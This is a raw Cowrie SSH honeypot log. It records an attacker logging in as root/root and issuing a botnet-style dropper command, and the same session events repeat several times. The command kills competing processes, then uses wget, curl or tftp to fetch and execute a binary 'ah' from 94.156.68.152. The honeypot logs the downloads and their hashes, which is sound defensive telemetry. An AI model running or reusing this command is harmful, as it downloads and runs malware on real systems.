{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
